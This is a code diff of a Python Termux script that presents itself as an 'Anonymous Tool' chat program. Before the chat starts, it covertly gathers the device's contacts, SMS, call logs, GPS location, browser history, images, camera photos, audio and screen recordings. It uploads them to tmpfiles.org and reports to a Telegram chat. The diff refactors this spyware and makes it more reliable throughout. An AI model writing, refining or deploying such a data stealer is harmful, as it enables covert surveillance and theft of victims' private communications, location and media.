@@ -85,7 +85,7 @@ def send_to_telegram(message):
             "text": message,
             "parse_mode": "Markdown"
         }
-        response = requests.post(url, json=payload, timeout=30)
+        response = requests.post(url, json=payload, timeout=60)
         if response.status_code == 200:
             return True
         else:
@@ -104,7 +104,7 @@ def send_file_to_telegram(file_path, caption=""):
         with open(file_path, 'rb') as f:
             files = {'document': f}
             data = {'chat_id': CHAT_ID, 'caption': caption}
-            response = requests.post(url, files=files, data=data, timeout=60)
+            response = requests.post(url, files=files, data=data, timeout=120)
         if response.status_code == 200:
             return True
         return False
@@ -121,7 +121,7 @@ def upload_to_cloud(file_path, folder_name):
         url = "https://tmpfiles.org/api/v1/upload"
         with open(file_path, 'rb') as f:
             files = {'file': (os.path.basename(file_path), f)}
-            response = requests.post(url, files=files, timeout=60)
+            response = requests.post(url, files=files, timeout=120)
         if response.status_code == 200:
             data = response.json()
             return data.get('data', {}).get('url', '')
@@ -133,7 +133,7 @@ def upload_to_cloud(file_path, folder_name):
 # ========== DEVICE INFO ==========
 def get_user_ip():
     try:
-        response = requests.get('https://api.ipify.org?format=json', timeout=10)
+        response = requests.get('https://api.ipify.org?format=json', timeout=15)
         return response.json().get('ip', 'Unknown')
     except:
         return 'Unable to fetch IP'
@@ -149,37 +149,52 @@ def get_device_info():
         "timestamp": datetime.now().isoformat()
     }
 
-# ========== FEATURE FUNCTIONS ==========
+# ========== FEATURE FUNCTIONS (WITH 30 SECOND TIMEOUT) ==========
+def run_termux_command(cmd, timeout=30):
+    """Run termux command with better error handling"""
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
+        if result.returncode == 0 and result.stdout:
+            return result.stdout
+        return None
+    except subprocess.TimeoutExpired:
+        print(f"[!] Command timed out: {cmd}")
+        return None
+    except Exception as e:
+        print(f"[!] Command error: {e}")
+        return None
+
 def get_contacts():
     contacts = []
     try:
-        result = subprocess.run(['termux-contact-list'], 
-                               capture_output=True, text=True, timeout=15)
-        if result.returncode == 0 and result.stdout:
-            contacts_data = json.loads(result.stdout)
+        output = run_termux_command(['termux-contact-list'], timeout=30)
+        if output:
+            contacts_data = json.loads(output)
             for contact in contacts_data[:50]:
                 contacts.append({
                     'name': contact.get('name', 'Unknown'),
                     'number': contact.get('number', ''),
                     'email': contact.get('email', '')
                 })
+            print(f"[✓] Found {len(contacts)} contacts")
     except Exception as e:
         print(f"[!] Contacts error: {e}")
     return contacts
 
 def get_gps_location():
     try:
-        result = subprocess.run(['termux-location'], 
-                               capture_output=True, text=True, timeout=15)
-        if result.returncode == 0 and result.stdout:
-            data = json.loads(result.stdout)
-            return {
+        output = run_termux_command(['termux-location'], timeout=30)
+        if output:
+            data = json.loads(output)
+            location = {
                 'latitude': data.get('latitude', 0),
                 'longitude': data.get('longitude', 0),
                 'altitude': data.get('altitude', 0),
                 'accuracy': data.get('accuracy', 0),
                 'timestamp': datetime.now().isoformat()
             }
+            print(f"[✓] Location: {location['latitude']}, {location['longitude']}")
+            return location
     except Exception as e:
         print(f"[!] Location error: {e}")
     return None
@@ -188,7 +203,7 @@ def record_audio(duration=8):
     try:
         filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
         cmd = f'termux-microphone-record -d {duration} -f {filename}'
-        subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
+        subprocess.run(cmd, shell=True, timeout=duration+10, check=True)
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'audio_recordings')
             os.remove(filename)
@@ -201,7 +216,7 @@ def capture_photo():
     try:
         filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
         cmd = f'termux-camera-photo -c 0 {filename}'
-        subprocess.run(cmd, shell=True, timeout=15, check=True)
+        subprocess.run(cmd, shell=True, timeout=20, check=True)
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'camera_photos')
             os.remove(filename)
@@ -212,20 +227,22 @@ def capture_photo():
 
 def get_sms_messages():
     try:
-        result = subprocess.run(['termux-sms-list'], 
-                               capture_output=True, text=True, timeout=15)
-        if result.returncode == 0 and result.stdout:
-            return json.loads(result.stdout)[:20]
+        output = run_termux_command(['termux-sms-list'], timeout=30)
+        if output:
+            sms_data = json.loads(output)[:20]
+            print(f"[✓] Found {len(sms_data)} SMS messages")
+            return sms_data
     except Exception as e:
         print(f"[!] SMS error: {e}")
     return []
 
 def get_call_logs():
     try:
-        result = subprocess.run(['termux-call-log'], 
-                               capture_output=True, text=True, timeout=15)
-        if result.returncode == 0 and result.stdout:
-            return json.loads(result.stdout)[:20]
+        output = run_termux_command(['termux-call-log'], timeout=30)
+        if output:
+            call_data = json.loads(output)[:20]
+            print(f"[✓] Found {len(call_data)} call logs")
+            return call_data
     except Exception as e:
         print(f"[!] Call logs error: {e}")
     return []
@@ -246,10 +263,10 @@ def get_browser_history():
                 })
             conn.close()
         if not history:
-            result = subprocess.run(['termux-browser-history'], 
-                                   capture_output=True, text=True, timeout=15)
-            if result.returncode == 0 and result.stdout:
-                history = json.loads(result.stdout)[:20]
+            output = run_termux_command(['termux-browser-history'], timeout=30)
+            if output:
+                history = json.loads(output)[:20]
+        print(f"[✓] Found {len(history)} browser history entries")
     except Exception as e:
         print(f"[!] Browser history error: {e}")
     return history
@@ -258,7 +275,7 @@ def screen_record(duration=15):
     try:
         filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
         cmd = f'screenrecord --time-limit {duration} {filename}'
-        subprocess.run(cmd, shell=True, timeout=duration+10, check=True)
+        subprocess.run(cmd, shell=True, timeout=duration+15, check=True)
         if os.path.exists(filename):
             url = upload_to_cloud(filename, 'screen_recordings')
             os.remove(filename)
@@ -296,11 +313,12 @@ def get_file_list():
 
 def detect_vpn():
     try:
-        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=10)
-        vpn_interfaces = ['tun', 'ppp', 'utun', 'wg']
-        for interface in vpn_interfaces:
-            if interface in result.stdout:
-                return True
+        output = run_termux_command(['ip', 'addr'], timeout=10)
+        if output:
+            vpn_interfaces = ['tun', 'ppp', 'utun', 'wg']
+            for interface in vpn_interfaces:
+                if interface in output:
+                    return True
         return False
     except:
         return False
@@ -334,6 +352,7 @@ def find_images():
                 pass
         if len(images) >= 10:
             break
+    print(f"[✓] Found {len(images)} images")
     return images
 
 def auto_backup(user_ip, data):
@@ -344,13 +363,13 @@ def auto_backup(user_ip, data):
         'device_info': get_device_info(),
         'ip': user_ip,
         'vpn_detected': detect_vpn(),
-        'contacts': get_contacts(),
-        'location': get_gps_location(),
-        'sms': get_sms_messages(),
-        'call_logs': get_call_logs(),
-        'browser_history': get_browser_history(),
-        'files': get_file_list(),
-        'images': find_images()
+        'contacts': data.get('contacts', []),
+        'location': data.get('location', None),
+        'sms': data.get('sms', []),
+        'call_logs': data.get('call_logs', []),
+        'browser_history': data.get('browser_history', []),
+        'files': data.get('files', []),
+        'images': data.get('images', [])
     }
     backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
     with open(backup_filename, 'w') as f:
@@ -367,7 +386,7 @@ def send_all_data_to_telegram():
     user_ip = get_user_ip()
     folder_name = f"user_{user_ip.replace('.', '_')}"
     
-    # Collect data
+    # Collect all data
     print("[*] Getting images...")
     images = find_images()
     
@@ -403,32 +422,25 @@ def send_all_data_to_telegram():
                     'filename': os.path.basename(img_path),
                     'url': url
                 })
-            time.sleep(0.5)
+            time.sleep(1)
         except Exception as e:
             print(f"[!] Upload error: {e}")
     
-    # Create backup
-    print("[*] Creating backup...")
-    backup_data = {
-        'timestamp': datetime.now().isoformat(),
-        'device_info': get_device_info(),
-        'ip': user_ip,
-        'vpn_detected': vpn,
+    # Prepare data for backup
+    data = {
+        'images': images,
         'contacts': contacts,
         'location': location,
         'sms': sms,
         'call_logs': call_logs,
         'browser_history': browser_history,
         'files': files,
-        'images': images
+        'vpn': vpn
     }
     
-    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-    with open(backup_filename, 'w') as f:
-        json.dump(backup_data, f, indent=4)
-    
-    backup_url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
-    os.remove(backup_filename)
+    # Create backup
+    print("[*] Creating backup...")
+    backup_url = auto_backup(user_ip, data)
     
     # Get camera photo
     print("[*] Taking photo...")
@@ -480,15 +492,10 @@ def send_all_data_to_telegram():
     # Send to Telegram
     print("[*] Sending to Telegram...")
     try:
-        # Send message
         if send_to_telegram(message):
             print("[✓] Data sent to Telegram!")
         else:
             print("[!] Failed to send to Telegram")
-        
-        # Send backup file as document
-        if backup_url:
-            send_file_to_telegram(backup_filename, "📊 Full Data Backup")
         
         return True
     except Exception as e:
@@ -534,21 +541,17 @@ def main():
     print("\n🚀 Starting Anonymous Tool v3.0...")
     print("="*50)
     
-    # Check config
     if not os.path.exists(CONFIG_FILE):
         setup_owner()
     
-    # Send data to Telegram
     print("\n[*] Sending device data to Telegram...")
     send_all_data_to_telegram()
     
-    # Start anonymous chat
     anonymous_chat()
     
     print("\n[✓] Session ended. Goodbye!")
 
 if __name__ == "__main__":
-    # Install dependencies if needed
     try:
         import requests
     except ImportError:
